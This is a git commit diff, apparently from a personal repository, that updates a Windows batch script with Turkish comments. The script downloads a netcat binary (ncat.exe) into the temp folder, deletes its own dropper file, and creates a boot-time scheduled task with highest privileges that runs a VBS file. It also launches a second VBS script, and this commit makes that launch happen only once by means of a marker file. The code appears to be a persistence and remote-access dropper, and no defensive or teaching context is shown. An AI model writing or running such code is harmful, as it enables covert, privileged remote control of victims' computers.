e20ee481fecb148a10597af73b418e3d2a48a01b
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-07 12:56:45 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,16 +1,24 @@
 @echo off
 setlocal
 
-REM Görev var mı kontrol et
-schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1
+set "marker=%temp%\marker.txt"
 
-if %errorlevel% neq 0 (
+REM Görevi kontrol et
+schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1
+set "taskExists=%errorlevel%"
+
+if %taskExists% neq 0 (
     REM Görev YOKSA
     del /f /q "asd.bat"
     cd /d %temp%
     curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
     schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
-    start "" "%temp%\rb.vbs"
+
+    REM rb.vbs sadece marker yoksa çalışsın
+    if not exist "%marker%" (
+        start "" "%temp%\rb.vbs"
+        echo ran > "%marker%"
+    )
 ) else (
     REM Görev VARSA
     del /f /q "asd.bat"
